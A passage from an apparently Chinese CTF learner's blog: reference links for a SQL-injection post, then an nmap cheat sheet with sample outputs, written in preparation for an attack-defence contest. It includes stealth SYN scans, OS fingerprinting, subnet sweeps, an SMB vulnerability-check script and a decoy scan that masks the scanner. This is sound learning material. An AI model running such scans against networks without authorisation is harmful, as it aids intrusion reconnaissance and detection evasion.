<h3 id="bb两句："><a href="#bb两句：" class="headerlink" title="bb两句："></a>bb两句：</h3><p>wdnmd，一天的任务变成两天完成了，SQL的函数都还没看，还是太菜了（基础太差，哭了）</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>method1：<a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p>
<p>method2：<a href="https://www.codercto.com/a/81951.html" target="_blank" rel="noopener">https://www.codercto.com/a/81951.html</a></p>
<p>sql：<a href="https://www.runoob.com/sql/sql-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/sql/sql-tutorial.html</a></p>
<p>堆叠注入：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p>
<p>show:<a href="https://www.cnblogs.com/SQL888/p/5750161.html" target="_blank" rel="noopener">https://www.cnblogs.com/SQL888/p/5750161.html</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2019/07/22/nmap/">
                nmap
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-07-22</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>后天要参加人生第一次awd线下攻防了，今天赶紧突击一下，先学习一下nmap的一些常规操作</p>
<h3 id="引入："><a href="#引入：" class="headerlink" title="引入："></a>引入：</h3><p><strong>1) 获取远程主机的系统类型及开放端口</strong></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nmap</span> -sS -P0 -sV -O <span class="symbol">&lt;target&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的 &lt; target &gt; 可以是单一 IP, 或主机名，或域名，或子网</p>
<p>-sS TCP SYN 扫描 (又称半开放,或隐身扫描)<br>-P0 允许你关闭 ICMP pings.<br>-sV 打开系统版本检测<br>-O 尝试识别远程操作系统</p>
<p>其它选项:</p>
<p>-A 同时打开操作系统指纹和版本检测<br>-v 详细输出扫描情况.</p>
<p><strong>2) 列出开放了指定端口的主机列表</strong></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p <span class="number">80</span> -oG – <span class="number">192.168</span><span class="number">.1</span>.* | grep open</span><br></pre></td></tr></table></figure>

<p><strong>3) 在网络寻找所有在线主机</strong></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sP</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span>.*</span><br></pre></td></tr></table></figure>

<p>或者也可用以下命令:</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>指定 subnet</p>
<p><strong>4) Ping 指定范围内的 IP 地址</strong></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span><span class="number">-254</span></span><br></pre></td></tr></table></figure>

<p><strong>5) 在某段子网上查找未占用的 IP</strong></p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-T4</span> <span class="selector-tag">-sP</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.2</span><span class="selector-class">.0</span>/<span class="selector-tag">24</span> <span class="selector-tag">&amp;</span><span class="selector-tag">&amp;</span> <span class="selector-tag">egrep</span> “<span class="selector-tag">00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span>″ /<span class="selector-tag">proc</span>/<span class="selector-tag">net</span>/<span class="selector-tag">arp</span></span><br></pre></td></tr></table></figure>

<p><strong>6) 在局域网上扫找 Conficker 蠕虫病毒</strong></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PN -T4 -p139,<span class="number">445</span> -n -v –script=smb-check-vulns –script-args safe=<span class="number">1</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span><span class="number">-254</span></span><br></pre></td></tr></table></figure>

<p><strong>7) 扫描网络上的恶意接入点 （rogue APs）.</strong></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p1<span class="number">-85</span>,<span class="number">113</span>,<span class="number">443</span>,<span class="number">8080</span><span class="number">-8100</span> -T4 –min-hostgroup <span class="number">50</span> –max-rtt-timeout</span><br><span class="line"><span class="number">2000</span> –initial-rtt-timeout <span class="number">300</span> –max-retries <span class="number">3</span> –host-timeout <span class="number">20</span>m</span><br><span class="line">–max-scan-delay <span class="number">1000</span> -oA wapscan <span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p><strong>8 ) 使用诱饵扫描方法来扫描主机端口</strong></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.10</span> <span class="selector-tag">-D</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.2</span></span><br></pre></td></tr></table></figure>

<p><strong>9) 为一个子网列出反向DNS记录</strong></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -R -sL <span class="number">209.85</span>.<span class="number">229.99</span>/<span class="number">27</span> | awk ‘&#123;<span class="keyword">if</span>($3==”<span class="keyword">not</span>”)<span class="keyword">print</span>”(“$2″) <span class="keyword">no</span> PTR”;<span class="keyword">else</span> <span class="keyword">print</span>$3″ is “$2&#125;’ | <span class="keyword">grep</span> ‘(‘</span><br></pre></td></tr></table></figure>

<p><strong>10) 显示网络上共有多少台 Linux 及 Win 设备?</strong></p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -F -O <span class="number">192.168</span>.<span class="number">0.1</span>-<span class="number">255</span> | <span class="keyword">grep</span> “Running: ” &gt; <span class="regexp">/tmp/</span>os; echo “$(cat <span class="regexp">/tmp/</span>os | <span class="keyword">grep</span> Linux \</span><br><span class="line">| wc -l) Linux device(s)”; echo “$(cat <span class="regexp">/tmp/</span>os | <span class="keyword">grep</span> Windows | wc -l) Window(s) device”</span><br></pre></td></tr></table></figure>

<p>### </p>
<h3 id="1-用主机名和IP地址扫描系统"><a href="#1-用主机名和IP地址扫描系统" class="headerlink" title="1. 用主机名和IP地址扫描系统"></a>1. 用主机名和IP地址扫描系统</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> server2.tecmint.<span class="keyword">com</span>（<span class="number">192.168</span>.<span class="number">0.101</span>）</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">15</span>:<span class="number">42</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.415</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="2-扫描使用“-v”选项"><a href="#2-扫描使用“-v”选项" class="headerlink" title="2.扫描使用“-v”选项"></a>2.扫描使用“-v”选项</h3><p>你可以看到下面的命令使用“ <strong>-</strong>v “选项后给出了远程机器更详细的信息。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -v server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">15</span>:<span class="number">43</span> EST</span><br><span class="line">Initiating ARP Ping Scan against <span class="number">192.168</span>.<span class="number">0.101</span> [<span class="number">1</span> port] at <span class="number">15</span>:<span class="number">43</span></span><br><span class="line">The ARP Ping Scan took <span class="number">0.01</span>s <span class="keyword">to</span> scan <span class="number">1</span> total hosts.</span><br><span class="line">Initiating SYN Stealth Scan against server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) [<span class="number">1680</span> ports] at <span class="number">15</span>:<span class="number">43</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">22</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">80</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">8888</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">111</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">3306</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">957</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">The SYN Stealth Scan took <span class="number">0.30</span>s <span class="keyword">to</span> scan <span class="number">1680</span> total ports.</span><br><span class="line">Host server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span> ... good.</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.485</span> seconds</span><br><span class="line">               Raw packets sen<span class="variable">t:</span> <span class="number">1681</span> (<span class="number">73.962</span>KB) | Rcvd: <span class="number">1681</span> (<span class="number">77.322</span>KB)</span><br></pre></td></tr></table></figure>

<h3 id="3-扫描多台主机"><a href="#3-扫描多台主机" class="headerlink" title="3.扫描多台主机"></a>3.扫描多台主机</h3><p>你可以简单的在Nmap命令后加上多个IP地址或主机名来扫描多台主机。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span> <span class="number">192.168</span>.<span class="number">0.102</span> <span class="number">192.168</span>.<span class="number">0.103</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">06</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.580</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="4-扫描整个子网"><a href="#4-扫描整个子网" class="headerlink" title="4.扫描整个子网 *"></a>4.扫描整个子网 *</h3><p>你可以使用*通配符来扫描整个子网或某个范围的IP地址。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0</span>.*</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">11</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server1.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.100</span>):</span><br><span class="line">Not shown: <span class="number">1677</span> closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">111</span>/tcp <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">851</span>/tcp <span class="keyword">open</span>  unknown</span><br><span class="line"> </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">256</span> IP addresses (<span class="number">2</span> hosts <span class="keyword">up</span>) scanned in <span class="number">5.550</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="5-使用IP地址的最后一个字节扫描多台服务器-，"><a href="#5-使用IP地址的最后一个字节扫描多台服务器-，" class="headerlink" title="5.使用IP地址的最后一个字节扫描多台服务器 ，"></a>5.使用IP地址的最后一个字节扫描多台服务器 ，</h3><p>你可以简单的指定IP地址的最后一个字节来对多个IP地址进行扫描。例如，我在下面执行中扫描了IP地址192.168.0.101，192.168.0.102和192.168.0.103。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span>,<span class="number">102</span>,<span class="number">103</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">09</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.552</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="6-从一个文件中扫描主机列表-iL"><a href="#6-从一个文件中扫描主机列表-iL" class="headerlink" title="6. 从一个文件中扫描主机列表 -iL"></a>6. 从一个文件中扫描主机列表 -iL</h3><p>如果你有多台主机需要扫描且所有主机信息都写在一个文件中，那么你可以直接让nmap读取该文件来执行扫描，让我们来看看如何做到这一点。</p>
<p>创建一个名为“nmaptest.txt ”的文本文件，并定义所有你想要扫描的服务器IP地址或主机名。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[root@server1 ~]</span># <span class="selector-tag">cat</span>  <span class="selector-tag">nmaptest</span><span class="selector-class">.txt</span> </span><br><span class="line"><span class="selector-tag">localhost</span></span><br><span class="line"><span class="selector-tag">server2</span><span class="selector-class">.tecmint</span><span class="selector-class">.com</span></span><br><span class="line">192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.101</span></span><br></pre></td></tr></table></figure>

<p>接下来运行带“iL”选项的nmap命令来扫描文件中列出的所有IP地址</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -iL nmaptest.txt </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">10</span>:<span class="number">58</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> localhost.localdomain (<span class="number">127.0</span>.<span class="number">0.1</span>):</span><br><span class="line">Not shown: <span class="number">1675</span> closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">25</span>/tcp  <span class="keyword">open</span>  smtp</span><br><span class="line"><span class="number">111</span>/tcp <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">631</span>/tcp <span class="keyword">open</span>  ipp</span><br><span class="line"><span class="number">857</span>/tcp <span class="keyword">open</span>  unknown</span><br><span class="line"> </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">958</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">958</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.047</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="7-扫描一个IP地址范围"><a href="#7-扫描一个IP地址范围" class="headerlink" title="7.扫描一个IP地址范围 -"></a>7.扫描一个IP地址范围 -</h3><p>你可以在nmap执行扫描时指定IP范围。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span>-<span class="number">110</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">09</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Nmap finished: <span class="number">10</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.542</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="8-排除一些远程主机后再扫描–exclude"><a href="#8-排除一些远程主机后再扫描–exclude" class="headerlink" title="8.排除一些远程主机后再扫描–exclude"></a>8.排除一些远程主机后再扫描–exclude</h3><p>在执行全网扫描或用通配符扫描时你可以使用“–exclude”选项来排除某些你不想要扫描的主机。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0</span>.* --exclude <span class="number">192.168</span>.<span class="number">0.100</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">16</span> EST</span><br><span class="line">Interesting ports <span 